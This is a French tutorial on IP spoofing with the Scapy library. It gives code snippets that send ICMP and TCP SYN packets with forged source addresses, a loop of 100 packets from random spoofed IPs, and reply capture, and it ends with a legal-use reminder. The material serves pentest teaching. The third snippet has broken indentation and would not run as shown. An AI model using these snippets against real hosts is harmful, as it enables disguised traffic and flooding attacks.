**Présentation de Scapy et Contexte** :  
Scapy est une bibliothèque Python puissante conçue pour l'analyse, la manipulation, l'envoi et la réception de paquets réseau. Elle est largement utilisée dans les domaines de la cybersécurité, du diagnostic réseau et des tests de pénétration grâce à sa flexibilité et à sa compatibilité avec de nombreux protocoles (TCP, UDP, ICMP, ARP, DNS, etc.).

Dans le cadre d'un IP Spoofing, contrairement à d'autres outils préconfigurés, Scapy permet de personnaliser chaque champ du paquet (adresse IP source, protocoles, payload, etc.), rendant possible la simulation de scénarios complexes et ciblés. De plus, sa simplicité d'utilisation via Python en fait un outil puissant pour les tests de pénétration, l'évaluation des pare-feu et la recherche en cybersécurité  
### **Commandes Scapy pour l'IP Spoofing**

L'IP Spoofing consiste à falsifier l'adresse IP source d'un paquet pour masquer son origine ou simuler une autre identité. Voici les principales commandes Scapy pour réaliser un IP Spoofing :

---

#### **1. Envoyer un paquet IP avec une adresse source falsifiée**  
Envoyer un paquet ICMP avec une adresse IP source falsifiée :

```python  
from scapy.all import *

# Création et envoi d'un paquet IP spoofé  
spoofed_pkt = IP(src="192.168.1.100", dst="192.168.1.1")/ICMP()  
send(spoofed_pkt)  
```

---

#### **2. IP Spoofing avec une requête TCP SYN**  
Envoyer un paquet TCP avec un drapeau SYN et une adresse IP source falsifiée :

```python  
from scapy.all import *

# Création d'un paquet TCP spoofé  
spoofed_syn = IP(src="10.0.0.100", dst="192.168.1.1")/TCP(dport=80, flags="S")  
send(spoofed_syn)  
```

---

#### **3. Envoi en masse de paquets spoofés**  
Envoyer plusieurs paquets avec des adresses IP source aléatoires :

```python  
from scapy.all import *  
import random

# Génération d'une adresse IP aléatoire  
def random_ip():  
return ".".join(map(str, (random.randint(1, 255) for _ in range(4))))

# Envoi massif de paquets spoofés  
for _ in range(100):  
spoofed_pkt = IP(src=random_ip(), dst="192.168.1.1")/ICMP()  
send(spoofed_pkt)  
```

---

#### **4. IP Spoofing avec un payload personnalisé**  
Ajouter une charge utile au paquet spoofé :

```python  
from scapy.all import *

# Paquet spoofé avec un payload personnalisé  
spoofed_payload = IP(src="192.168.1.100", dst="192.168.1.1")/ICMP()/Raw(load="Custom Payload")  
send(spoofed_payload)  
```

---

#### **5. Capturer et analyser les réponses aux paquets spoofés**  
Capturer les réponses générées par les paquets spoofés envoyés :

```python  
from scapy.all import *

# Envoi d'un paquet spoofé et capture des réponses  
spoofed_pkt = IP(src="192.168.1.100", dst="192.168.1.1")/ICMP()  
ans, unans = sr(spoofed_pkt, timeout=2)

# Affichage des réponses  
ans.summary()  
```

---  
### **Conclusion**

L'IP Spoofing, bien que couramment utilisé dans les tests de sécurité, est une technique puissante qui permet de falsifier l'origine d'un paquet réseau. Avec **Scapy**, cette méthode devient accessible et flexible grâce à sa capacité à manipuler les paquets avec précision et à simuler divers scénarios réseau.

Cependant, il est essentiel de rappeler que l'IP Spoofing, comme toutes les techniques de pentest, doit être réalisé uniquement dans un cadre légal et éthique, avec l'autorisation explicite des propriétaires des systèmes testés. Scapy est un outil incontournable pour les professionnels du réseau, mais son utilisation doit toujours respecter les bonnes pratiques en matière de cybersécurité.
